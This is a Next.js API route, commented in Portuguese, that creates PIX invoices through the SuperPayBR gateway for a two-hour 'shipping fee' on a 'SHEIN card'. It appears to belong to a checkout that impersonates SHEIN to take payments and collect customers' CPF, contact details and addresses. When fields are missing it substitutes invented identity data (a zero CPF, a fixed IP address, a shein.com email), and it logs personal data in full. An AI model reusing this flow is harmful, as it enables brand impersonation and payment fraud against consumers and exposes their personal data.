import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA SUPERPAYBR ===")

    const body = await request.json()
    const { amount, shipping, method } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 Dados da fatura SuperPayBR:", {
      amount,
      shipping,
      method,
      cliente: cpfData.nome,
      email: userEmail,
    })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error(`Falha na autenticação SuperPayBR: ${authResult.error}`)
    }

    const accessToken = authResult.data.access_token

    // Gerar external_id único
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Preparar dados da fatura SuperPayBR conforme documentação
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          district: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01001000",
          country: "BR",
        },
        ip: request.headers.get("x-forwarded-for") || "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0], // 2 horas
        referer: `SHEIN_FRETE_${method}`,
        installment: 1,
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            title: `Frete ${method} - Cartão SHEIN`,
            qnt: 1,
            amount: Number.parseFloat(amount),
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("🚀 Enviando para SuperPayBR API...")
    console.log("📤 Payload:", JSON.stringify(invoiceData, null, 2))

    // Criar fatura na SuperPayBR
    const createResponse = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta SuperPayBR:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura SuperPayBR criada com sucesso!")
      console.log("📋 Dados da fatura:", JSON.stringify(invoiceResult, null, 2))

      // Extrair dados do PIX com múltiplas tentativas
      let pixPayload = ""
      let qrCodeImage = ""

      // Tentar diferentes caminhos para encontrar o PIX payload
      if (invoiceResult.fatura?.pix?.payload) {
        pixPayload = invoiceResult.fatura.pix.payload
        qrCodeImage = invoiceResult.fatura.pix.image || ""
      } else if (invoiceResult.pix?.payload) {
        pixPayload = invoiceResult.pix.payload
        qrCodeImage = invoiceResult.pix.image || ""
      } else if (invoiceResult.payload) {
        pixPayload = invoiceResult.payload
      }

      console.log("🔍 PIX Payload encontrado:", pixPayload ? "✅ SIM" : "❌ NÃO")
      console.log("🖼️ QR Code Image:", qrCodeImage ? "✅ SIM" : "❌ NÃO")

      // Gerar QR Code usando QuickChart SEMPRE
      const qrCodeUrl = pixPayload
        ? `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
        : "/placeholder.svg?height=250&width=250"

      console.log("🎯 QR Code URL final:", qrCodeUrl)

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.fatura?.id || invoiceResult.id || externalId,
        invoice_id: invoiceResult.fatura?.invoice_id || invoiceResult.invoice_id || externalId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl, // Usar sempre QuickChart
          qr_code: qrCodeUrl, // Usar sempre QuickChart
        },
        status: {
          code: invoiceResult.fatura?.status?.code || invoiceResult.status?.code || 1,
          title: invoiceResult.fatura?.status?.title || invoiceResult.status?.title || "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(Number.parseFloat(amount) * 100), // SuperPayBR usa centavos
          liquido: Math.round(Number.parseFloat(amount) * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      }

      console.log("🎯 Fatura mapeada final:", JSON.stringify(mappedInvoice, null, 2))

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        message: "Fatura SuperPayBR criada com sucesso",
        debug: {
          has_pix_payload: !!pixPayload,
          qr_code_url: qrCodeUrl,
          raw_response_keys: Object.keys(invoiceResult),
        },
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura SuperPayBR:", createResponse.status, errorText)

      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${errorText}`)
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura SuperPayBR:", error)

    // Retornar erro para que o frontend possa criar PIX de emergência
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro desconhecido ao criar fatura SuperPayBR",
        should_create_emergency: true,
      },
      { status: 500 },
    )
  }
}

export async function GET(request: NextRequest) {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
  })
}
